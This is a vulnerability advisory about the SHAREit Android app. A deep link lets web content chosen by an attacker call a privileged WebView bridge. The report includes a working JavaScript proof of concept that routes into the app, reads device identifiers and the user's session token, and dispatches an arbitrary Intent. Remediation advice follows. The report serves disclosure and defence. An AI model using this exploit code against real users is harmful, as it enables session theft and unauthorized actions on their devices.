# SHAREit Android exposes privileged native actions to attacker-controlled web content

| Field | Value |
|---|---|
| Package | `com.lenovo.anyshare.gps` |
| Runtime tested | `6.27.38_ww` (`4062738`) |
| Release channel | `GOOGLEPLAY` |
| Status | Reproduced |
| Severity | High â€” CVSS 3.1: **7.1** |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N` |
| Researcher | Edward 'Actuator' Warren |

## Summary

SHAREit can load an attacker-controlled HTTPS page in an application WebView through its command-21 deep-link route. The WebView exposes `window.shareitBridge`, allowing arbitrary page JavaScript to retrieve device and session information and dispatch native Android Intents.

The historical `window.client` API was absent during testing, but equivalent privileged operations remain reachable through the generic `shareitBridge.syncInvoke()` and `shareitBridge.asyncInvoke()` dispatcher. The previous issue therefore appears **migrated/partially mitigated rather than removed**.

## Attack chain

```text
Attacker HTTPS page
  â†’ package-pinned shareits://hybrid/21 deep link
  â†’ SHAREit HybridLocalActivity loads attacker URL
  â†’ attacker JavaScript invokes shareitBridge
  â†’ GAID/device/session data returned
  â†’ executeSystemEvent dispatches attacker-supplied Intent URI
```

The initial page visit is the only required user interaction. Chrome or Android may display an external-application confirmation depending on platform configuration.

## Proof of concept

Open an HTTPS page that first routes into SHAREit:

```javascript
const page = encodeURIComponent(location.href);

if (!window.shareitBridge) {
  location.href =
    `intent://hybrid/21?url=${page}` +
    `#Intent;scheme=shareits;package=com.lenovo.anyshare.gps;end`;
}
```

When the same page loads inside SHAREit, invoke the exposed bridge:

```javascript
const device = shareitBridge.syncInvoke("web", "getDeviceInfo", "");
const login  = shareitBridge.syncInvoke("web", "getLoginInfo", "");

shareitBridge.asyncInvoke(
  "web",
  "executeSystemEvent",
  "callback",
  JSON.stringify({
    event: "1",
    uri: "intent:#Intent;action=android.intent.action.MAIN;" +
         "category=android.intent.category.LAUNCHER;" +
         "package=com.google.android.calculator;end"
  })
);
```

## Observed result

- `getDeviceInfo` returned the GAID, device model, OS details, application version and release channel.
- `getLoginInfo` returned a SHAREit user ID and session token.
- `executeSystemEvent` accepted an attacker-supplied Intent URI and launched Google Calculator.
- `window.client` and its historical direct methods were absent.
- `window.shareitBridge.syncInvoke`, `asyncInvoke` and `inject` were present.

Sensitive runtime values are intentionally redacted from this report.

## Relevant implementation

| Surface | Class/interface | Relevant operation |
|---|---|---|
| Hybrid WebView | `com.ushareit.hybrid.ui.HybridLocalActivity` | Loads command-21 URL content |
| JavaScript interface | `window.shareitBridge` / `t3a` | `syncInvoke`, `asyncInvoke`, `inject` |
| Device action | `v81` | `getDeviceInfo`, including GAID |
| Login action | `v81` | `getLoginInfo` |
| Intent action | `InterLevelAction` | `executeSystemEvent(event, uri)` |

Static review found `addJavascriptInterface` registration through `dp8.l()` and the action implementations above. For event `1`, the supplied URI reaches `Intent.parseUri()` and native Activity dispatch.

## Security impact

An attacker-controlled page loaded through the SHAREit route can combine:

1. device and advertising identifier disclosure;
2. SHAREit user/session token disclosure; and
3. native Intent dispatch from the SHAREit application context.

The minimized PoC launches Calculator. The underlying primitive accepts an Intent URI and may expose higher-impact SHAREit-internal or cross-application interactions depending on reachable components.


## Remediation

- Never inject privileged JavaScript interfaces into remote or attacker-controlled origins.
- Enforce an exact HTTPS origin allowlist after every redirect and before bridge registration.
- Remove GAID and session material from web-accessible actions.
- Replace generic action/Intent dispatch with narrowly scoped, allowlisted operations.
- Reject explicit components, non-exported targets and arbitrary Intent URI fields.
- Invalidate any tokens exposed during testing.
